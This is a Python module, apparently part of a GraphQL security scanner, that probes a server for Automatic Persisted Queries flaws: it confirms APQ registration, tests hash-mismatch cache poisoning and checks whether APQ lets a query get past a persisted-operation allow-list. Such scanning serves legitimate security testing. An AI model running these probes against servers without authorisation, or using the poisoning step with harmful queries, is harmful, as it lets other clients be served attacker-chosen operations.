"""Automatic Persisted Queries (APQ) attacks: registration, hash-mismatch cache poisoning, allow-list bypass.

APQ lets a client send a query once with its sha256 hash to register it, then replay it by hash alone.
Two things go wrong in practice:
- a server that does NOT verify that sha256Hash actually matches the query will cache an attacker's query
  under a chosen hash, so the next client asking for that hash runs the attacker's query (cache poisoning);
- when a server only accepts pre-registered/allow-listed operations, APQ registration can smuggle an
  arbitrary query past the allow-list.

Confirmation is register -> replay-by-hash -> observe, so hits are self-verifying.
"""

from __future__ import annotations

import hashlib
from typing import Any

import requests


def _sha256(query: str) -> str:
    return hashlib.sha256(query.encode()).hexdigest()


def _ext(sha: str) -> dict:
    return {"persistedQuery": {"version": 1, "sha256Hash": sha}}


_PQNF = ("persistedquerynotfound",)
_MISMATCH = ("does not match", "provided sha", "sha256hash does not", "mismatch", "hash mismatch")
_ALLOWLIST = ("persistedqueryonly", "only persisted", "must be a persisted", "not allowed",
              "allowlist", "allow list", "not in the list", "query is not allowed", "operation not allowed")


def probe_apq(target_url: str, query: str = "{__typename}", session: Any = None,
              headers: dict | None = None, timeout: int = 15) -> dict[str, Any]:
    """Run the APQ registration / poisoning / allow-list checks. Returns {findings, observations}."""
    http = session or requests
    hdr = dict(headers or {})
    hdr.setdefault("Content-Type", "application/json")
    correct = _sha256(query)
    obs: list[str] = []
    findings: list[tuple[str, str]] = []

    def post(payload: dict) -> tuple[int, dict | None, str]:
        try:
            r = http.post(target_url, json=payload, headers=hdr, timeout=timeout)
        except requests.RequestException as e:
            return 0, None, str(e)[:80]
        try:
            body = r.json()
        except ValueError:
            body = None
        return r.status_code, body if isinstance(body, dict) else None, (r.text or "")

    def matches(text: str, needles: tuple[str, ...]) -> bool:
        low = (text or "").lower()
        return any(n in low for n in needles)

    # 0. Is APQ even active? An unknown hash should report PersistedQueryNotFound.
    _st, _b, text0 = post({"extensions": _ext(correct)})
    if matches(text0, _PQNF):
        obs.append("APQ active (unknown hash -> PersistedQueryNotFound)")
    else:
        obs.append("APQ probe: no PersistedQueryNotFound for an unknown hash (APQ may be off)")

    # 1. Registration: send query + its correct hash, then replay by hash alone.
    st1, _b1, text1 = post({"query": query, "extensions": _ext(correct)})
    accepted = st1 == 200 and not matches(text1, _PQNF) and not matches(text1, _MISMATCH)
    apq_open = False
    if accepted:
        _st, _b, text1b = post({"extensions": _ext(correct)})
        apq_open = not matches(text1b, _PQNF) and _st == 200
        obs.append("APQ registration works (query registered, then executed by hash-only)"
                   if apq_open else "APQ registration: full query accepted but hash-only replay failed")
    else:
        obs.append(f"APQ registration rejected (HTTP {st1})")

    # 2. Hash-mismatch cache poisoning: register the query under a hash that does NOT match it.
    wrong = _sha256(query + "//gqlpoison")
    st2, _b2, text2 = post({"query": query, "extensions": _ext(wrong)})
    if matches(text2, _MISMATCH):
        obs.append("hash mismatch REJECTED (server verifies sha256Hash == query) - not poisonable")
    elif st2 == 200:
        _st, _b, text2b = post({"extensions": _ext(wrong)})
        if not matches(text2b, _PQNF) and _st == 200:
            findings.append(("APQ Cache Poisoning (unverified persisted-query hash)",
                             f"the server cached a query under a hash that does NOT match it (no sha256 "
                             f"verification) and served it by that hash - a client requesting "
                             f"{wrong[:16]}... now runs an attacker-chosen query."))
            obs.append("hash-mismatch ACCEPTED and replayable -> CACHE POISONING")
        else:
            obs.append("hash-mismatch not rejected, but the wrong hash did not replay (inconclusive)")
    else:
        obs.append(f"hash-mismatch registration returned HTTP {st2}")

    # 3. Allow-list bypass: is a plain arbitrary query rejected as persisted-only?
    _st, _b, text3 = post({"query": query})
    if matches(text3, _ALLOWLIST):
        if apq_open:
            findings.append(("Persisted-Query Allow-list Bypass via APQ",
                             "plain queries are rejected (a persisted-operation allow-list is enforced), but "
                             "an arbitrary query registered via APQ then executed by hash RUNS - any "
                             "operation can be smuggled past the allow-list."))
            obs.append("plain query blocked (allow-list) + APQ registration runs -> ALLOW-LIST BYPASS")
        else:
            obs.append("plain queries blocked (persisted-only), and APQ registration did not work either")
    else:
        obs.append("plain arbitrary queries are accepted (no persisted-query allow-list enforced)")

    return {"findings": findings, "observations": obs}
